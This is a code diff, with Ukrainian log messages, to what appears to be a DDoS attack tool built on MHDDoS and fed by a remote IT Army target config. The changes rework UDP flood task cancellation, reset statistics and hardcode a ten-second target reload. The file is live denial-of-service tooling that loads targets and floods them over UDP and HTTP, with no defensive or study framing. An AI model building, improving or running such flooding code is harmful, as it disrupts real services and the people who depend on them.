@@ -1,6 +1,5 @@
 import asyncio
 from contextlib import suppress
-
 # @formatter:off
 import colorama; colorama.init()
 # @formatter:on
@@ -11,7 +10,6 @@ from threading import Event, Thread
 from typing import Any, Generator, Iterator, List, Optional
 
 from src.cli import init_argparse
-from src.concurrency import DaemonThreadPool
 from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, Params, Stats
 from src.dns_utils import resolve_all_targets
 from src.mhddos import async_main as mhddos_async_main, AsyncLayer4, AsyncHttpFlood
@@ -52,15 +50,18 @@ class Flooder:
 
 async def udp_flooder(runnable: AsyncLayer4) -> None:
     backoff = 0.1
-    while True:
-        try:
-            await runnable.run()
-        except asyncio.CancelledError:
-            raise
-        except Exception:
-            # avoid costly cycles if fails immediately
-            await asyncio.sleep(backoff)
-            backoff = max(2, backoff*2)
+    try:
+        while True:
+            try:
+                await runnable.run()
+            except asyncio.CancelledError:
+                return
+            except:
+                 # avoid costly cycles if fails immediately
+                await asyncio.sleep(backoff)
+                backoff = max(2, backoff*2)
+    except asyncio.CancelledError:
+        return
 
 
 async def run_ddos(
@@ -109,15 +110,18 @@ async def run_ddos(
         await asyncio.sleep(5)
 
     flooders = [Flooder(switch_after) for _ in range(total_threads)]
-    udp_taskset = None
+    udp_tasks = []
 
     async def load_targets():
         targets, changed = await targets_loader.load()
         targets = await resolve_all_targets(targets)
         return [target for target in targets if target.is_resolved], changed
 
-    def install_targets(targets):
-        nonlocal udp_taskset
+    async def install_targets(targets):
+        nonlocal udp_tasks
+        # XXX: looks like a hack
+        for k in list(statistics):
+            del statistics[k]
         kwargs_list, udp_kwargs_list = [], []
         for target in targets:
             assert target.is_resolved, "Unresolved target cannot be used for attack"
@@ -142,11 +146,12 @@ async def run_ddos(
             for flooder in flooders:
                 flooder.update_targets(runnables_iter)
         if udp_kwargs_list:
+            if udp_tasks:
+                for task in udp_tasks:
+                    task.cancel()
+                await asyncio.wait(udp_tasks)
             udp_runnables = [mhddos_async_main(**kwargs) for kwargs in udp_kwargs_list]
-            udp_tasks = [asyncio.ensure_future(udp_flooder(run)) for run in udp_runnables]
-            if udp_taskset is not None:
-                udp_taskset.cancel()
-            udp_taskset = asyncio.ensure_future(asyncio.gather(*udp_tasks))
+            udp_tasks = [asyncio.create_task(udp_flooder(run)) for run in udp_runnables]
 
     try:
         initial_targets, _ = await load_targets()
@@ -157,7 +162,7 @@ async def run_ddos(
     if not initial_targets:
         logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
         exit()
-    install_targets(initial_targets)
+    await install_targets(initial_targets)
 
     tasks = [asyncio.ensure_future(f.loop()) for f in flooders]
 
@@ -201,11 +206,12 @@ async def run_ddos(
                         f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
                     )
                 else:
-                    install_targets(targets)
+                    await install_targets(targets)
             except asyncio.CancelledError:
                 raise
             except Exception as exc:
-                logger.warning(f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей{cl.RESET}")
+                logger.warning(
+                    f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
             finally:
                 logger.info(
                     f"{cl.YELLOW}Оновлення цілей через: "
@@ -214,7 +220,7 @@ async def run_ddos(
   
     # setup coroutine to reload targets (if configuration file is given)
     if targets_loader.dynamic:
-        tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=reload_after)))
+        tasks.append(asyncio.ensure_future(reload_targets(delay_seconds=10)))
 
     async def reload_proxies(delay_seconds: int = 30):
         while True:
